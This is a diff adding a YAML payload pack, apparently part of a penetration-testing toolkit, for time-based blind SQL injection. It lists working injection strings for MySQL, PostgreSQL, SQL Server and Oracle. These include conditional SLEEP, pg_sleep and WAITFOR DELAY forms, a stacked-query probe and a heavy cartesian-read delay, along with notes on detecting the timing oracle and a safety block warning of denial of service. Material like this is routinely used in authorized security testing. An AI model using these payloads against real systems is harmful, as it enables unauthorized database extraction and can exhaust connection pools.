@@ -1,0 +1,70 @@
+# Conditional delays. {{DELAY}} is in seconds and must be chosen from measured
+# jitter, not from habit: five times the observed spread is the working rule, and
+# a delay that does not scale when {{DELAY}} changes is not an oracle.
+#
+# SQLite has no server-side sleep primitive. That absence is a real result, not a
+# gap in this pack -- see the entry at the end.
+id: sqli/time
+reviewed: "2026-08-23"   # not re-verified since; treat as unreviewed, not current
+title: Time-based blind inference constructs
+variables: [DELAY, COND]
+credits:
+  - "Conditional-delay inference is long-standing public technique; entries are written for this project."
+safety: >
+  Every request holds a backend connection open for {{DELAY}} seconds. On a
+  pooled backend this is a denial-of-service primitive at very low request rates.
+  Keep {{DELAY}} small, keep concurrency at one, and agree a ceiling with the
+  client before running this against production.
+entries:
+  - name: unconditional delay
+    dbms: [mysql]
+    payload: "' AND SLEEP({{DELAY}}) AND 'a'='a"
+    detect: "Response time rises by roughly {{DELAY}} seconds. Establishes that a delay can be induced at all."
+
+  - name: conditional delay
+    dbms: [mysql]
+    payload: "' AND IF(({{COND}}),SLEEP({{DELAY}}),0) AND 'a'='a"
+    detect: "Delay occurs only when {{COND}} is true; this is the oracle."
+
+  - name: unconditional delay
+    dbms: [postgresql]
+    payload: "' AND (SELECT pg_sleep({{DELAY}})) IS NOT NULL AND 'a'='a"
+    detect: "Response time rises by roughly {{DELAY}} seconds."
+
+  - name: conditional delay
+    dbms: [postgresql]
+    payload: "' AND (SELECT CASE WHEN ({{COND}}) THEN pg_sleep({{DELAY}}) ELSE pg_sleep(0) END) IS NOT NULL AND 'a'='a"
+    detect: "Both branches call the same function, so only the delay differs -- the shapes stay indistinguishable to a filter."
+
+  - name: unconditional delay
+    dbms: [mssql]
+    payload: "'; WAITFOR DELAY '0:0:{{DELAY}}'--"
+    detect: "SQL Server's delay is a statement, so this doubles as a stacked-query signal."
+    note: "If this delays, HRR-INJ-01-STACK is likely to succeed as well -- record the observation there."
+
+  - name: conditional delay
+    dbms: [mssql]
+    payload: "'; IF ({{COND}}) WAITFOR DELAY '0:0:{{DELAY}}'--"
+    detect: "Delay occurs only when {{COND}} is true."
+
+  - name: unconditional delay
+    dbms: [oracle]
+    payload: "' AND (SELECT COUNT(*) FROM all_objects, all_objects WHERE ROWNUM <= 100000) >= 0 AND 'a'='a"
+    detect: "A deliberate heavy read rather than a sleep call, because Oracle's sleep primitive normally requires privileges the application user lacks."
+    note: "The row ceiling is the safety control. Raise it only in small steps, and measure -- an unbounded cartesian product is a denial-of-service payload, not a probe."
+
+  - name: conditional delay
+    dbms: [oracle]
+    payload: "' AND CASE WHEN ({{COND}}) THEN (SELECT COUNT(*) FROM all_objects, all_objects WHERE ROWNUM <= 100000) ELSE 0 END >= 0 AND 'a'='a"
+    detect: "The heavy read runs only when {{COND}} is true."
+
+  - name: no delay primitive
+    dbms: [sqlite]
+    payload: "' AND 1=1 AND 'a'='a"
+    detect: "Placeholder for the SQLite branch: SQLite exposes no server-side sleep, and a deliberate heavy read is unreliable on an embedded engine."
+    note: "On SQLite, prune this node and record the absence of a delay primitive as the reason rather than reporting the test as skipped."
+
+  - name: proportionality control
+    dbms: [mysql, postgresql, mssql, oracle]
+    payload: "' AND 1=1 AND 'a'='a"
+    detect: "Baseline form for the timing series. Run the unconditional delay at two different {{DELAY}} values and confirm the observed times scale; a fixed delay that does not scale is a proxy timeout, not an oracle."
